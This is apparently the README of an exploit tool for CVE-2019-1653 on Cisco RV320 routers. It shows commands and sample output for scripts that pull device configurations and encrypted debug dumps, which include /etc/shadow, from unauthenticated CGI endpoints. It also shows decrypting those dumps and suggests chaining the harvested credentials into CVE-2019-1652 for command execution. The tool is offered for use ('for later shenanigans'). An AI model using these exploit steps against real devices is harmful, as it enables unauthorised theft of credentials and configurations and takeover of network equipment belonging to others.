# CiscoRV320Dump
CVE-2019-1653 Exploit For Dumping Cisco RV320 Configurations

All this does is dump the config out to a file for later shenanigans using the CVE-2019-1653 exploits disclosed by Red Team Pentesting GmbH.

## Example Use:

For the [configuration dump exploit](https://seclists.org/fulldisclosure/2019/Jan/52), just set target, port, ssl on/off, and output directory. It will dump the configuration to there. 
```
$ python getconfig.py -t x.x.x.x -p 8443 -s -d output
{+} Sending request to https://x.x.x.x:8443/cgi-bin/config.exp
{*} We seem to have found a valid config! Writing to output/x.x.x.x_8443.conf
$
```

For the [debug data dumping exploit](https://seclists.org/fulldisclosure/2019/Jan/53), it is the same routine, but the dumped data is larger and encrypted. 
You will want to decrypt this using the provided "decrypt.sh" script, or manually using `openssl`. This will give you a tar file.
The debug output not only gets you the config, but also backups of `/etc` and `/var`, and yes, the `/etc/shadow/` file is present.
I'll eventually rewrite the decryption script in Python, but this was a quick kludge.
```
$ python getdebug.py -t x.x.x.x -p 8443 -s -d output
{+} Sending request to https://x.x.x.x:8443/cgi-bin/export_debug_msg.exp
{*} We seem to have found a valid encrypted config! Writing to output/x.x.x.x_8443.enc
$ ./decrypt.sh output/x.x.x.x_8443.enc 
Cisco Encrypted Debug Data Decryption Script!
{+} Decrypting output/x.x.x.x_8443.enc
{+} Plaintext should be at output/x.x.x.x_8443.enc.decrypted.tar.gz...
$ 
```

Using the creds you get from these (usually hashed) you can then exploit [CVE-2019-1652](https://seclists.org/fulldisclosure/2019/Jan/54) to execute commands on the device. Maybe I'll get around to writing an exploit for that part to round out the whole shitshow.
